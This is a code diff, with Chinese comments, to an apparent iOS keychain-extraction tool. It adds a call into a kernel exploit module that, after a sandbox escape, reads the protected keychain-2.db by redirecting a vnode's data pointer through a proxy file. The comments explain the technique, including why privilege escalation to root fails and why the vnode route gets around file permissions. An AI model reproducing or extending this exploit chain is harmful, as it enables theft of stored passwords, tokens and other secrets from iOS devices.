@@ -46,6 +46,10 @@
 // sandbox_escape.m 编译为 C 链接，此处需用 extern "C" 避免 C++ 名字修饰
 extern "C" int sandbox_access_is_active(void);
 
+// 来自 kexploit/vnode.m：通过 vnode 重定向读取无权打开的文件（如 keychain-2.db）
+// 同样编译为 C 链接，需 extern "C" 避免 C++ 名字修饰
+extern "C" int vnode_read_file_via_redirect(const char *target, const char *proxy, const char *dst);
+
 namespace kc {
 
 // ---------------------------------------------------------------------
@@ -81,14 +85,36 @@ static const char* kDbFiles[] = {
 };
 
 static void CopyKeychainDatabase(const std::string& dstDir) {
+    const bool exploitActive = sandbox_access_is_active() == 1;
     Log("copy: uid=" + std::to_string(getuid()) +
         " euid=" + std::to_string(geteuid()) +
-        " sandbox_active=" + std::to_string(sandbox_access_is_active()));
+        " sandbox_active=" + std::to_string(exploitActive ? 1 : 0));
+
+    // 代理文件：由本进程拥有，仅用于承载一个可被安全改写的 vnode。
+    const std::string proxy = dstDir + "/.keychain_redirect_proxy";
+
     const size_t count = sizeof(kDbFiles) / sizeof(kDbFiles[0]);
     for (size_t i = 0; i < count; i++) {
         const char* f = kDbFiles[i];
         std::string src = std::string(kSrcDir) + f;
         std::string dst = dstDir + "/" + f;
+
+        // 主路径：vnode 重定向。keychain-2.db 属主为 _securityd 且 mode 0600，
+        // 即使沙盒逃逸，uid=501 仍会被 POSIX DAC 拒绝（EACCES）；而提权到 root
+        // 需要写只读的 zalloc_ro 区域（ucred/proc_ro），socket 写原语会 EFAULT。
+        // vnode->v_data 位于可写 kalloc 区，因此改为重定向 v_data 读取。
+        int copied = -1;
+        if (exploitActive) {
+            copied = vnode_read_file_via_redirect(src.c_str(), proxy.c_str(), dst.c_str());
+        }
+
+        if (copied > 0) {
+            Log("copy: redirected " + src + " -> " + dst +
+                " (" + std::to_string(copied) + " bytes)");
+            continue;
+        }
+
+        // 回退路径：普通 copyfile（仅在以 root 运行或 iOS < 26 时可用）。
         errno = 0;
         if (copyfile(src.c_str(), dst.c_str(), nullptr, COPYFILE_DATA) != 0) {
             int err = errno;
@@ -105,6 +131,8 @@ static void CopyKeychainDatabase(const std::string& dstDir) {
                 std::to_string(err));
         }
     }
+
+    unlink(proxy.c_str());
     Log("Keychain database successfully copied to " + dstDir);
 }
 
